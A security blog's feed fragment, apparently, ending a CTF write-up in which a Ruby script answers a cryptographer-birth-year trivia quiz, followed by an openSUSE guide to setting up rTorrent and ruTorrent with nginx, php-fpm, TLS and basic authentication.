class="line">                    search.results.shift    <span class="comment"># remove first item of the array</span></div><div class="line">                <span class="keyword">end</span></div><div class="line">            <span class="keyword">end</span></div><div class="line">            find = <span class="literal">false</span>    <span class="comment"># for the next search</span></div><div class="line">        <span class="keyword">end</span></div><div class="line">    <span class="keyword">end</span></div><div class="line"><span class="keyword">end</span></div><div class="line">s.close               <span class="comment"># Close the socket when done</span></div></pre></td></tr></table></figure></p>
<p>Here is the output of the script:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div></pre></td><td class="code"><pre><div class="line">[noraj@rawsec]–––––––––––––––––––––––––––––––––––[~/CTF/Insomnihack/Teaser/2017]</div><div class="line">$ ruby cryptoquizz.rb</div><div class="line"></div><div class="line">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</div><div class="line">~~ Hello, young hacker. Are you ready to fight rogue machines ?    ~~</div><div class="line">~~ Now, you&apos;ll have to prove us that you are a genuine             ~~</div><div class="line">~~ cryptographer.                                                  ~~</div><div class="line">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</div><div class="line"></div><div class="line"></div><div class="line">~~ What is the birth year of Nigel P. Smart ?</div><div class="line">Nigel P. Smart: 1967</div><div class="line"></div><div class="line"></div><div class="line">~~ What is the birth year of Don Coppersmith ?</div><div class="line">Don Coppersmith: 1950</div><div class="line"></div><div class="line"></div><div class="line">~~ What is the birth year of Niels Ferguson ?</div><div class="line">Niels Ferguson: 1965</div><div class="line"></div><div class="line"></div><div class="line">~~ What is the birth year of Mihir Bellare ?</div><div class="line">Mihir Bellare: 1962</div><div class="line"></div><div class="line"></div><div class="line">~~ What is the birth year of Amos Fiat ?</div><div class="line">Amos Fiat: 1956</div><div class="line"></div><div class="line"></div><div class="line">~~ What is the birth year of Wang Xiaoyun ?</div><div class="line">Wang Xiaoyun: 1966</div><div class="line"></div><div class="line"></div><div class="line">~~ What is the birth year of Eli Biham ?</div><div class="line">Eli Biham: 1960</div><div class="line"></div><div class="line"></div><div class="line">~~ What is the birth year of Martin Hellman ?</div><div class="line">Martin Hellman: 1945</div><div class="line"></div><div class="line"></div><div class="line">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</div><div class="line">~~ OK, young hacker. You are now considered to be a                ~~</div><div class="line">~~ INS&#123;GENUINE_CRYPTOGRAPHER_BUT_NOT_YET_A_PROVEN_SKILLED_ONE&#125;     ~~</div><div class="line">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</div></pre></td></tr></table></figure></p>
<p>Flag was: <code>INS{GENUINE_CRYPTOGRAPHER_BUT_NOT_YET_A_PROVEN_SKILLED_ONE}</code>.</p>
<p><strong>Opinion</strong>: I don't kniw if <em>cryptopathe</em> (challenge's author) did it on purpose to make it harder or did it unintentionally because he/she didn't checked his/her challenge and used a crappy data set, but giving wrong, partial, diminutive, nickname is very problematic for searches. I think this is not a well written challenge.</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;informations&quot;&gt;Informations&lt;/h2&gt;
&lt;h3 id=&quot;version&quot;&gt;Version&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;By&lt;/th&gt;
&lt;th&gt;Version&lt;/th&gt;
&lt;th&gt;Comment&lt;/th&gt;
&lt;/t
    
    </summary>
    
      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
    
    
      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
    
      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
    
      <category term="misc" scheme="http://rawsec.ml/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>OpenSUSE : Install rTorrent and ruTorrent</title>
    <link href="http://rawsec.ml/en/opensuse-install-rtorrent-rutorrent/"/>
    <id>http://rawsec.ml/en/opensuse-install-rtorrent-rutorrent/</id>
    <published>2016-12-29T23:00:00.000Z</published>
    <updated>2017-02-07T18:23:36.855Z</updated>
    
    <content type="html"><![CDATA[<ul>
<li>Install rTorrent, git ang nginx:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># zypper install rtorrent git nginx</div></pre></td></tr></table></figure></p>
<p><strong>Warning</strong>: rtorrent package in official openSUSE repository is not compiled with xmlrpc so you won't be able to use it with rutorrent.</p>
<ul>
<li>Add the php devel repository to be able to install php7:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"># zypper addrepo http://download.opensuse.org/repositories/devel:languages:php/openSUSE_Leap_42.1/devel:languages:php.repo</div><div class="line"># zypper refresh</div><div class="line"># zypper install php7 php7-fpm</div></pre></td></tr></table></figure></p>
<ul>
<li>Go to the default web folder and clone the <a href="https://github.com/Novik/ruTorrent" target="_blank" rel="external">ruTorrent</a> git repository:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ cd /srv/www/htdocs/</div><div class="line"># git clone https://github.com/Novik/ruTorrent.git rutorrent</div></pre></td></tr></table></figure></p>
<ul>
<li>Enable and start nginx:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># systemctl enable nginx.service</div><div class="line"># systemctl start nginx.service</div></pre></td></tr></table></figure></p>
<ul>
<li>Open php configuration:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># vim /etc/php7/cli/php.ini</div></pre></td></tr></table></figure></p>
<ul>
<li>Disable php exposure (<a href="http://php.net/manual/en/ini.core.php#ini.expose-php" target="_blank" rel="external">expose_php</a>):</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">expose_php = Off</div></pre></td></tr></table></figure></p>
<ul>
<li>Enable file uploads (<a href="http://php.net/manual/en/ini.core.php#ini.file-uploads" target="_blank" rel="external">file_uploads</a>):</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">file_uploads = On</div></pre></td></tr></table></figure></p>
<ul>
<li>Set the maximum size of an uploaded file (<a href="http://php.net/manual/en/ini.core.php#ini.upload-max-filesize" target="_blank" rel="external">upload_max_filesize</a>):</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">upload_max_filesize = 15M</div></pre></td></tr></table></figure></p>
<ul>
<li>Set max size of post data allowed (<a href="http://php.net/manual/en/ini.core.php#ini.post-max-size" target="_blank" rel="external">post_max_size</a>):</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">post_max_size = 15M</div></pre></td></tr></table></figure></p>
<ul>
<li>Set the timezone (<a href="http://php.net/manual/en/datetime.configuration.php#ini.date.timezone" target="_blank" rel="external">date.timezone</a>).</li>
<li>For more security, limit the files that can be accessed by php (<a href="http://php.net/manual/en/ini.core.php#ini.open-basedir" target="_blank" rel="external">open_basedir</a>):</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">open_basedir = /srv/www/htdocs/rutorrent</div></pre></td></tr></table></figure></p>
<ul>
<li>Change the value of cgi.fix_pathinfo to zero for security reasons:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cgi.fix_pathinfo=0</div></pre></td></tr></table></figure></p>
<ul>
<li>Save and quit <code>php.ini</code>.</li>
<li>Create the <code>php-fpm.conf</code> and <code>www.conf</code> files:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># cp /etc/php7/fpm/php-fpm.conf.default /etc/php7/fpm/php-fpm.conf</div><div class="line"># cp /etc/php7/fpm/php-fpm.d/www.conf.default /etc/php7/fpm/php-fpm.d/www.conf</div></pre></td></tr></table></figure></p>
<ul>
<li>Edit the php-fpm configuration:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># vim /etc/php7/fpm/php-fpm.conf</div></pre></td></tr></table></figure></p>
<ul>
<li>To enable php-fpm log, uncomment this line (the default prefix is <code>/var</code>):</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">error_log = log/php-fpm.log</div></pre></td></tr></table></figure></p>
<ul>
<li>Edit the php-fpm pool file:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># vim /etc/php7/fpm/php-fpm.d/www.conf</div></pre></td></tr></table></figure></p>
<ul>
<li>Configure the owner of the nginx process to the Nginx user:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">user = nginx</div><div class="line">group = nginx</div></pre></td></tr></table></figure></p>
<ul>
<li>Configure php-fpm to run under a socket file, not a port:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">listen = /var/run/php-fpm.sock</div></pre></td></tr></table></figure></p>
<ul>
<li>Change the permissions for the unix socket to the nginx user, group and mode:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">listen.owner = nginx</div><div class="line">listen.group = nginx</div><div class="line">listen.mode = 0660</div></pre></td></tr></table></figure></p>
<ul>
<li>Enable and start php-fpm:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># systemctl enable php-fpm</div><div class="line"># systemctl start php-fpm</div></pre></td></tr></table></figure></p>
<ul>
<li>Create an authentification folder for nginx:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># mkdir /etc/nginx/auth</div></pre></td></tr></table></figure></p>
<ul>
<li>Create the virtual servers directories:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># mkdir /etc/nginx/servers-available</div><div class="line"># mkdir /etc/nginx/servers-enabled</div></pre></td></tr></table></figure></p>
<ul>
<li>Edit the nginx configuration file:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># vim /etc/nginx/nginx.conf</div></pre></td></tr></table></figure></p>
<ul>
<li>And add this config:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div></pre></td><td class="code"><pre><div class="line">user nginx;</div><div class="line">worker_processes auto;</div><div class="line">pid /var/run/nginx.pid;</div><div class="line"></div><div class="line">events &#123;</div><div class="line">    worker_connections 1024;</div><div class="line">    multi_accept on;</div><div class="line">    use epoll;</div><div class="line">&#125;</div><div class="line"></div><div class="line">http &#123;</div><div class="line"></div><div class="line">    charset UTF-8;</div><div class="line"></div><div class="line">    ##</div><div class="line">    # Basic Settings</div><div class="line">    ##</div><div class="line">    server_names_hash_bucket_size 64;</div><div class="line">    sendfile on;</div><div class="line">    tcp_nopush on;</div><div class="line">    tcp_nodelay on;</div><div class="line">    keepalive_timeout 65;</div><div class="line">    types_hash_max_size 2048;</div><div class="line">    server_tokens off;</div><div class="line"></div><div class="line">    # server_name_in_redirect off;</div><div class="line"></div><div class="line">    include /etc/nginx/mime.types;</div><div class="line">    default_type application/octet-stream;</div><div class="line"></div><div class="line">    ##</div><div class="line">    # Logging Settings</div><div class="line">    ##</div><div class="line">    access_log /var/log/nginx/access.log;</div><div class="line">    error_log /var/log/nginx/error.log;</div><div class="line"></div><div class="line">    ##</div><div class="line">    # Gzip Settings</div><div class="line">    ##</div><div class="line">    gzip on;</div><div class="line">    gzip_disable &quot;msie6&quot;;</div><div class="line">    gzip_vary on;</div><div class="line">    gzip_proxied any;</div><div class="line">    gzip_comp_level 6;</div><div class="line">    gzip_buffers 16 8k;</div><div class="line">    gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;</div><div class="line"></div><div class="line">    ##</div><div class="line">    # Virtual Host Configs</div><div class="line">    ##</div><div class="line">    include /etc/nginx/servers-enabled/*;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<ul>
<li>Save and quit.</li>
<li>Create the server domain config:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># vim /etc/nginx/servers-available/seedbox.conf</div></pre></td></tr></table></figure></p>
<ul>
<li>And add the config:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div></pre></td><td class="code"><pre><div class="line">server &#123;</div><div class="line">    listen 80;</div><div class="line">    listen [::]:80;</div><div class="line">    # Redirect all HTTP requests to HTTPS with a 301 Moved Permanently response.</div><div class="line">    return 301 https://$host$request_uri;</div><div class="line">&#125;</div><div class="line"></div><div class="line">##</div><div class="line"># BLOCK SERVEUR HTTPS</div><div class="line">##</div><div class="line">server &#123;</div><div class="line">    # http2 not supported by nginx 1.8.1</div><div class="line">    listen 443 ssl;</div><div class="line">    server_name seedbox.domain.example.org;</div><div class="line">    root /srv/www/htdocs/rutorrent;</div><div class="line">    index index.php index.html index.htm;</div><div class="line"></div><div class="line">##</div><div class="line"># SSL</div><div class="line">##</div><div class="line">    ssl_certificate /etc/nginx/ssl/seedbox.crt;</div><div class="line">    ssl_certificate_key /etc/nginx/ssl/seedbox.key;</div><div class="line"></div><div class="line">    ssl_protocols TLSv1.2;</div><div class="line">    ssl_ciphers EECDH+CHACHA20:EECDH+AESGCM:EECDH+AES;</div><div class="line">    ssl_ecdh_curve secp384r1;</div><div class="line">    ssl_prefer_server_ciphers on;</div><div class="line"></div><div class="line">    # ssl optimizations</div><div class="line">    ssl_session_timeout 5m;</div><div class="line">    ssl_session_cache shared:SSL:20m;</div><div class="line">    ssl_session_tickets on;</div><div class="line"></div><div class="line">##</div><div class="line"># SECURITY</div><div class="line">##</div><div class="line"></div><div class="line">    add_header X-XSS-Protection &quot;1; mode=block&quot;;</div><div class="line">    auth_basic &quot;Restricted Area&quot;;</div><div class="line">    auth_basic_user_file &quot;/etc/nginx/auth/seedbox_auth&quot;;</div><div class="line"></div><div class="line">##</div><div class="line"># PHP</div><div class="line">##</div><div class="line">    location / &#123;</div><div class="line">    index index.php index.html index.htm;</div><div class="line">    try_files $uri $uri/ /index.php?$args;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    location ~ \.php$ &#123;</div><div class="line">    try_files $uri =404;</div><div class="line">    fastcgi_split_path_info ^(.+\.php)(/.+)$;</div><div class="line">    fastcgi_pass unix:/var/run/php-fpm.sock;</div><div class="line">    fastcgi_index index.php;</div><div class="line">    fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;</div><div class="line">    include fastcgi_params;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    location ^~ /conf/ &#123;</div><div class="line">    deny all;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    location ^~ /share/ &#123;</div><div class="line">    deny all;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<ul>
<li>Don’t forget to change <code>server_name seedbox.domain.example.org;</code> with your own domain and create a CNAME entry in your DNS configuration.</li>
<li>Enable the server:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># ln -s /etc/nginx/servers-available/seedbox.conf /etc/nginx/servers-enabled/seedbox.conf</div></pre></td></tr></table></figure></p>
<ul>
<li>To configure a self-signed certificate, add the certificate folder:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># mkdir /etc/nginx/ssl</div></pre></td></tr></table></figure></p>
<ul>
<li>Generate self-signed certificate:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># cd /etc/nginx/ssl</div><div class="line"># openssl ecparam -genkey -name secp384r1 -out seedbox.key</div><div class="line"># openssl req -new -key seedbox.key -sha256 -out seedbox.csr</div><div class="line"># openssl req -x509 -days 3650 -sha256 -key seedbox.key -in seedbox.csr -out seedbox.crt</div></pre></td></tr></table></figure></p>
<ul>
<li>Modify files rights:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># chmod 644 /etc/nginx/ssl/*.crt</div><div class="line"># chmod 640 /etc/nginx/ssl/*.key</div></pre></td></tr></table></figure></p>
<ul>
<li>Create an user:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># useradd --shell /bin/bash --create-home sdbox</div><div class="line"># passwd sdbox</div></pre></td></tr></table></figure></p>
<ul>
<li>Create needed folder for rtorrent:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># mkdir -p /home/sdbox/&#123;torrents,watch,.session&#125;</div></pre></td></tr></table></figure></p>
<ul>
<li>Create rtorrent config file:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># vim /home/sdbox/.rtorrent.rc</div></pre></td></tr></table></figure></p>
<ul>
<li>Paste the config:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">scgi_port = 127.0.0.1:5001</div><div class="line">encoding_list = UTF-8</div><div class="line">port_range = 45000-65000</div><div class="line">port_random = no</div><div class="line">check_hash = no</div><div class="line">directory = /home/sdbox/torrents</div><div class="line">session = /home/sdbox/.session</div><div class="line">encryption = allow_incoming, try_outgoing, enable_retry</div><div class="line">schedule = watch_directory,1,1,&quot;load_start=/home/sdbox/watch/*.torrent&quot;</div><div class="line">schedule = untied_directory,5,5,&quot;stop_untied=/home/sdbox/watch/*.torrent&quot;</div><div class="line">use_udp_trackers = yes</div><div class="line">dht = off</div><div class="line">peer_exchange = no</div><div class="line">min_peers = 40</div><div class="line">max_peers = 100</div><div class="line">min_peers_seed = 10</div><div class="line">max_peers_seed = 50</div><div class="line">max_uploads = 15</div><div class="line">execute = &#123;sh,-c,/usr/bin/php /srv/www/htdocs/rutorrent/php/initplugins.php sdbox &amp;&#125;</div><div class="line">schedule = espace_disque_insuffisant,1,30,close_low_diskspace=500M</div></pre></td></tr></table></figure></p>
<ul>
<li>Give user permissions:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"># chown --recursive sdbox:users /home/sdbox</div><div class="line"># chown root:root /home/sdbox</div><div class="line"># chmod 755 /home/sdbox</div></pre></td></tr></table></figure></p>
<ul>
<li>Edit the virtual server config:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># vim /etc/nginx/servers-available/seedbox.conf</div></pre></td></tr></table></figure></p>
<ul>
<li>Add the config:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">location /SDBOX</div><div class="line">&#123;</div><div class="line">    include scgi_params;</div><div class="line">    scgi_pass 127.0.0.1:5001;</div><div class="line">    auth_basic &quot;Restricted Area&quot;;</div><div class="line">    auth_basic_user_file &quot;/etc/nginx/auth/seedbox_auth sdbox&quot;;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<ul>
<li>In order to do not install apache-tools, manually generate the auth file for sdbox user (it will write over the file and don’t forget to change the password in the command):</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ echo -n &quot;sdbox:&quot; | sudo tee /etc/nginx/auth/seedbox_auth &amp;&amp; openssl passwd -apr1 password | sudo tee -a /etc/nginx/auth/seedbox_auth</div></pre></td></tr></table></figure></p>
<ul>
<li>Protect the authentification file:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># chmod 600 /etc/nginx/auth/seedbox_auth</div><div class="line"># chown nginx:nginx /etc/nginx/auth/*</div></pre></td></tr></table></figure></p>
<ul>
<li>Create ruTorrent config file:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># mkdir /srv/www/htdocs/rutorrent/conf/users/sdbox</div><div class="line"># vim /srv/www/htdocs/rutorrent/conf/users/sdbox/config.php</div></pre></td></tr></table></figure></p>
<ul>
<li>And add the content:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"></div><div class="line">$pathToExternals[&apos;curl&apos;] = &apos;/usr/bin/curl&apos;;</div><div class="line">$topDirectory = &apos;/home/sdbox&apos;;</div><div class="line">$scgi_port = 5001;</div><div class="line">$scgi_host = &apos;127.0.0.1&apos;;</div><div class="line">$XMLRPCMountPoint = &apos;/SDBOX&apos;;</div><div class="line">$tempDirectory = &apos;/srv/www/htdocs/rutorrent/tmp/&apos;;</div></pre></td></tr></table></figure></p>
<ul>
<li>Correct permissions:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"># chown -R nginx:nginx /srv/www/htdocs/rutorrent</div><div class="line"># chmod 0777 /srv/www/htdocs/rutorrent/share/&#123;settings,torrents,users&#125;</div><div class="line"># systemctl restart nginx.service</div></pre></td></tr></table></figure></p>
<ul>
<li>Enable user lingering:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># loginctl enable-linger sdbox</div></pre></td></tr></table></figure></p>
<ul>
<li>To create a rTorrent service, create the file <code>/etc/systemd/system/rtorrent.service</code> containing:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">[Unit]</div><div class="line">Description=rTorrent Daemon</div><div class="line">After=network.target</div><div class="line"></div><div class="line">[Service]</div><div class="line">Type=forking</div><div class="line">KillMode=none</div><div class="line">User=sdbox</div><div class="line">ExecStart=/usr/bin/tmux new-session -c /mnt/storage/rtorrent -s rtorrent -n rtorrent -d rtorrent</div><div class="line">ExecStop=/usr/bin/bash -c &quot;/usr/bin/tmux send-keys -t rtorrent C-q &amp;&amp; while pidof rtorrent &gt; /dev/null; do sleep 0.5; done&quot;</div><div class="line">WorkingDirectory=/home/sdbox/</div><div class="line">Restart=on-failure</div><div class="line"></div><div class="line">[Install]</div><div class="line">WantedBy=multi-user.target</div></pre></td></tr></table></figure></p>
<ul>
<li>Enable rtorrent at boot time and manually start it:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># systemctl enable rtorrent</div><div class="line"># systemctl start rtorrent</div></pre></td></tr></table></figure></p>
<ul>
<li>To allow web traffic trought the firewall, create this file:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># vim /etc/sysconfig/SuSEfirewall2.d/services/httpd</div></pre></td></tr></table></figure></p>
<ul>
<li>And add this config:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">## Name: Web server</div><div class="line">## Description: opens ports for web servers in order to allow http and https traffic</div><div class="line"></div><div class="line"># space separated list of allowed TCP ports</div><div class="line">TCP=&quot;80 443&quot;</div></pre></td></tr></table></figure></p>
<ul>
<li>Now add the httpd config in the global settings:</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># vim /etc/sysconfig/SuSEfirewall2</div></pre></td></tr></table></figure></p>
<ul>
<li>
<p>And add <code>httpd</code> to <code>FW_CONFIGURATIONS_EXT</code>, for example <code>FW_CONFIGURATIONS_EXT=&quot;sshd httpd&quot;</code>.</p>
</li>
<li>
<p>Now restart the firewall:</p>
</li>
</ul>
